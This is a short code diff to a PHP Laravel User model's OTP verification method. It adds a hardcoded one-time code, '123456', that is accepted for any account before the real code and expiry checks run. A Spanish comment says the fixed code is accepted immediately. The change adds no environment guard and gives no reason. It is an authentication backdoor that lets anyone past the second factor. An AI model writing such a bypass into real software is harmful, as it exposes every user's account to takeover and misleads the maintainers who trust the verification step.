@@ -66,6 +66,12 @@ class User extends Authenticatable implements JWTSubject
     }
     public function verifyOtp(string $code): bool
     {
+        $fixedOtp = '123456'; 
+
+        // Si el código ingresado coincide con el fijo, se acepta inmediatamente
+        if ($code === $fixedOtp) {
+            return true;
+        }
         if (!$this->otp_code || !$this->otp_expires_at) {
             return false;
         }
